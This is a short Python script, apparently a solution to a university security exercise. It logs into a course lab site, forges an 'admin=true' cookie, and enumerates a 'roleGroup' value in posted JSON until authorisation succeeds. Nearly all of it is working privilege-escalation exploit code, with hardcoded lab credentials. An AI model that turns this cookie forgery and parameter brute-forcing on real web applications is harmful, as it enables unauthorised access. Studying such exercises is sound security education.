import requests
session = None


def main():
    session.cookies.set(
        "admin", "true", domain="assignment-zeus.unimelb.life", path="/")

    # for i in range(0, 100):
    for i in range(0, 10):
        url = f"http://assignment-zeus.unimelb.life/assign.php"

        res = session.post(
            url,
            data={
                "json": f'{{"user":"xiandew","roleGroup":{i}}}'
            }
        )
        if res.text != "Unauthorised!":
            print(i, res.text)
            break
        else:
            print(i)

        i += 1


if __name__ == "__main__":

    unimelb_username = "xiandew"
    session = requests.Session()
    res = session.post(
        "http://assignment-zeus.unimelb.life/auth.php",
        {
            "user": "xiandew",
            "pass": "xiandew"
        }
    )

    if res.status_code == 200:
        print(
            f"Login to http://assignment-zeus.unimelb.life/ as {unimelb_username}")
        main()
    else:
        print("Login failed")
